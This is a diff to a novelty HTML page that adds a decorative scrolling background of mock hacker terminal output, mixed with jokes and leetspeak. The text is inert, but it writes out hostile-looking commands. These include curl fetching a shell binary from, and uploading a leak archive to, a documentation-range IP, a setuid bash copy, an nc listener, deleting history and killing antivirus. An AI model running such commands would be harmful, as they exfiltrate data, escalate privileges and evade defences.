@@ -4,17 +4,18 @@
     <meta charset="UTF-8">
     <title>BREMNERTRON</title>
     <style>
-        body {
-            background-color: black;
-            color: #00FF00;
-            font-family: 'Courier New', Courier, monospace;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            overflow: hidden;
-        }
+    body {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+        padding: 0;
+        background: #111;
+        color: #0f0;
+        font-family: monospace;
+        overflow: hidden;
+    }
 
         .ascii-art {
             white-space: pre;
@@ -22,34 +23,170 @@
             z-index: 2;
         }
 
-        .hacker-bg {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            overflow: hidden;
-            z-index: 1;
-            opacity: 0.05;
-            font-size: 18px;
-            line-height: 1.2;
-            animation: scroll 10s linear infinite;
+        .scrolling-text {
+        position: absolute;
+        width: 100%;
+        height: 200%;
+        top: 100%;
+        left: 0;
+        display: flex;
+        flex-direction: column;
+        align-items: left;
+        animation: scroll-up 20s linear infinite;
+        pointer-events: none; /* Allows interaction with content above it */
+        opacity: 0.2; /* Light, subtle effect */
         }
 
-        @keyframes scroll {
-            from {
-                transform: translateY(0);
-            }
-            to {
-                transform: translateY(-50%);
-            }
+        .scrolling-text span {
+        white-space: nowrap;
+        font-size: 1.2rem;
+        line-height: 2rem;
+        text-align: center;
+        }
+
+        @keyframes scroll-up {
+        0% {
+            transform: translateY(0%);
+        }
+        100% {
+            transform: translateY(-100%);
+        }
         }
     </style>
 </head>
 <body>
-    <div class="hacker-bg">
+    <div class="scrolling-text">
         <pre>
-01101001 01101110 01110011 01100101 01110010 01110100
-01000010 01010010 01000101 01001101 01001110 01000101 01010010 01010100 01010010 01001111 01001110
-01110011 01111001 01110011 01110100 01100101 01101101 01100100 01100001 01110100 01100001
+[+] Initializing connection to node: 192.168.77.145:22
+[*] Injecting payload...
+
+>>> xor_shift() :: seed=0xA5B4C3D2
+>>> w3lc0m3 70 n16h7 c17y;
+0x0040FF1C: 43 68 65 63 6B 69 6E 67 20 63 72 65 64 65 6E 74 69
+4ll y0ur b453 4r3 b3l0n6 70 u5.
+[OK] Session token: 9f3a2d7b6e4c8a1f
+
+cat help.txt
+    >>>It's dangerous to go alone! Take this.
+Connecting to proxy chain...
+=> hop 1: 10.0.0.2 -> 172.16.3.5
+=> hop 2: 172.16.3.5 -> 203.0.113.55
+SHA256 [file.dat]: f7e5bc7de3a1e91b6e4abf92e2349987...
+[!] Elevating privileges...
++|-|3|23 |5 /\/() 5|*()()/\/
+
+sudo ./exploit.sh --force
+[DEBUG] Notice: "The cake is a lie."
+
+[+] Root access granted on 192.168.77.145
+LOADING MODULE: sys/core/persistence.dll
+>>> entropy_check() :: 98.73%
+
+Traceback (most recent call last):
+
+>>> sys_read(): buffer_overflow detected!
+
+[LOG] Sniffing interface eth0...
+Captured packet: src=192.168.1.4 dst=8.8.8.8 proto=ICMP len=84
+l3|9 l3|2()+|-|3|2 |5 \/\//-\+(|-||/\/9 `/()|_|
+[INFO] Keylogger active - session #42
+$ ssh-keygen -t rsa -b 4096 -f ~/.ssh/backdoor_key
+Encrypted payload embedded successfully.
+
+-- SYSTEM BREACH DETECTED --
+>>> MOTD: "Hack the planet!"
+Alert! Unauthorized access on port 443
+Downloading remote shell: curl -O http://198.51.100.23/shell.bin
+>>> anomaly_detected(): code=0x14F9
+$ whoami
+root
+Active connections:
+tcp 192.168.0.12:49872 -> 203.0.113.22:443 ESTABLISHED
+[DEBUG] Injected code at 0xDEADBEEF
+>>> obfuscate_payload(): success
+0x0000F010: 48 61 63 6B 20 74 68 65 20 77 6F 72 6C 64 2E 2E 2E
+[+] Dumping credentials from memory...
+User: admin Pass: p@ssw0rd123
+h3r3 b3 dr460n5
+>>> decrypt_session(): AES-256-GCM, IV=0x9A0B1C2D
+
+-- ACCESS GRANTED --
+
+cp /bin/bash /tmp/root_shell
+chmod +s /tmp/root_shell
+[INFO] Reverse shell initiated to 192.0.2.123:1337
+>>> cpu_temp_monitor(): 92.3C - throttling
+Compiling exploit... done.
+root@alpha:/# nc -lvnp 9001
+Listening on [0.0.0.0] (family 0, port 9001)
+Incoming connection from 10.1.1.15:54321
+sudo make me a sandwich
+
+
+>>> spoof_mac(): new MAC=DE:AD:BE:EF:00:42
+$ ./scan_networks.sh --stealth
+Scanning subnet: 10.0.0.0/24
+Host 10.0.0.13 is up - Open port: 22
+Host 10.0.0.47 is up - Open port: 445
+>>> buffer_flood(): packets sent=10,000
+
+
+
+*** WARNING: Memory leak detected in process 4021 ***
+[!] Exploit successful, gained shell on 172.16.0.55
+mv ~/.bash_history /dev/null
+>>> brute_force(): attempt 871/100000
+SSH login successful: user 'service'@192.168.0.254
+-- DOWNLOADING DATABASE DUMP --
+mysqldump --all-databases > dump.sql
+$ head -n 10 dump.sql
+CREATE DATABASE `secrets`;
+INSERT INTO `users` VALUES ('admin','5f4dcc3b5aa765d61d8327deb882cf99');
+
+>>> ransomware_deploy(): STATUS_OK
+file encrypted: /home/alice/Documents/report.docx.enc
+Current timestamp: 0x5F3759DF
+
+>>> port_knocking(): sequence [7000, 8000, 9000] accepted
+
+sudo ./rootkit_installer --silent
+[+] Kernel module loaded: backdoor.ko
+Starting deep packet inspection...
+Detected suspicious traffic: 192.168.1.10 -> 45.33.32.156
+
+>>> password_spray(): 250 accounts checked, 12 compromised
+-- SYSTEM COMPROMISED --
+Exporting environment variables...
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+LD_PRELOAD=/tmp/malicious.so
+
+[INFO] Screenshot captured - uploading...
+
+>>> dns_tunnel(): active on port 53
+hex_dump(): dumping memory region 0xBADC0DE0
+0xBADC0DE0: 00 FF 23 7A DE AD BE EF 12 34 56 78 9A BC DE F0
+[!] Attempting to disable security software...
+kill -9 $(pidof antivirusd)
+
+>>> forge_certificate(): CN=internal-ca, valid_until=2099
+netstat -antp | grep ESTABLISHED
+tcp 0 0 192.168.0.42:22 192.168.0.15:51872 ESTABLISHED
+>>> scan_ports(): found 12 open ports
+*** ALERT: Data exfiltration in progress ***
+curl -F "file=@/tmp/leak.zip" http://198.51.100.23/upload
+
+[INFO] FINISH HIM!
+rm -rf ~/.ssh/known_hosts
+>>> rsa_key_crack(): elapsed=3h42m - progress 27.4%
+
+
+
+
+
+
+
+--- END OF TRANSMISSION ---
+
         </pre>
     </div>
     <div class="ascii-art">
@@ -64,3 +201,5 @@
     </div>
 </body>
 </html>
+
+    
